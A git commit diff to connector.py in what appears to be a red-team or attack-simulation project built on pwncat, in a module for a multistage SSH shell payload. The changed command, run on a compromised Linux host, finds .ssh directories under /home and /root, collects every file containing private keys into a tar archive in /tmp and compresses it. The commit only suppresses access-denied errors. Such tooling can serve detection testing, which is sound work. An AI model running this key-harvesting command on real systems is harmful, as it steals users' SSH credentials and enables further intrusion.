747618e46eff369e0cbd27956e0b6a333ebb599a
credibleforce <jamiefrasermcmurray@gmail.com>
2024-02-12 12:24:00 -0800

    update connector to suppress access denied on find

--- terraform/modules/common/any/payload/linux/modules/connect-ssh-shell-multistage/resources/connector.py
+++ terraform/modules/common/any/payload/linux/modules/connect-ssh-shell-multistage/resources/connector.py
@@ -56,7 +56,7 @@ def execute(session: pwncat.manager.Session, task):
             session.log(result)
 
             result = session.platform.run(
-                'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar',
+                'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh 2>/dev/null | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar',
                 cwd="/tmp", timeout=900)
             session.log(result)
 
